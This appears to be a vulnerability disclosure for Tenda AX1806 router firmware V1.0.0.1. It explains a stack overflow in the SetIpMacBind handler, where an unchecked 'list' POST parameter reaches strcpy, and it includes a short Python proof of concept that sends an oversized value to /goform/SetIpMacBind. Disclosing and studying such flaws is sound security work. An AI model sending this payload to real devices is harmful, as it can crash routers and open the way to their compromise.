## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3422.html

## Affected version

AX1806 V1.0.0.1

## Vulnerability details

The Tenda AX1806 V1.0.0.1 firmware has a stack overflow vulnerability in the `SetIpMacBind` function. 

The `v1` variable receives the `list` parameter from a POST request and is passed to function `fromSetIpMacBind`.

![image-20240629144405195](SetIpMacBind/image-20240629144405195.png)

In the following processing function, the length of this parameter is not detected

Here in the `strcpy` function, a stack overflow is caused

![image-20240629144833400](SetIpMacBind/image-20240629144833400.png)

## POC

```
import requests

ip = "192.168.2.1"
url = "http://" + ip + "/goform/SetIpMacBind"
payload = "a"*1

data = {"bindnum": '2','list':"A"*0x2b0}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240629144944462](SetIpMacBind/image-20240629144944462.png)